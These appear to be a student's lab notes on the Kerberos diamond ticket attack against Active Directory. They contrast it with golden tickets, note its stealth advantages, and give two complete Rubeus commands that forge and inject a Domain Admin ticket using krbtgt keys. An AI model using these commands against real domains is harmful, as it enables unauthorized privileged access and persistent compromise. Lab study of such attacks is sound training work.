created by decrypting a valid TGT, making changes to it, and re-encrypt it using the AES keys of the krbtgt account
- golden ticket is TGT forging, diamond ticket is TGT modification
- persistence lifetime depends on krbtgt account

diamond tickets are more opsec safe
- valid ticket times because a TGT issued by the DC is modified
- in golden tickets, there is no corresponding TGT request since it was forged

# Rubeus

create the diamond ticket with rubeus
`Rubeus.exe diamond /krbkey:<aes_key> /user:<user> /password:<pass> /enctype:aes /ticketuser:administrator /domain:<DOMAIN> /dc:<DC_hostname>.<DOMAIN> /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`
- user in his case was the student account, so it doesn't have to be administrator


can also use /tgtdeleg option in place of creds if we have access to a domain user
`Rubeus.exe diamond /krbkey:<aes_key> /tgtdeleg /enctype:aes /ticketuser:administrator /domain:<DOMAIN> /dc:<DC_hostname>.<DOMAIN> /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`



# Learning Objective

### Use Domain Admin privileges obtained earlier to execute the Diamond Ticket attack

trying to sign in with student1 before
![Pasted image 20260204054244](assets/Pasted%20image%2020260204054244.png)

trying to sign in with student1 after
![Pasted image 20260204054349](assets/Pasted%20image%2020260204054349.png)
![Pasted image 20260204054421](assets/Pasted%20image%2020260204054421.png)
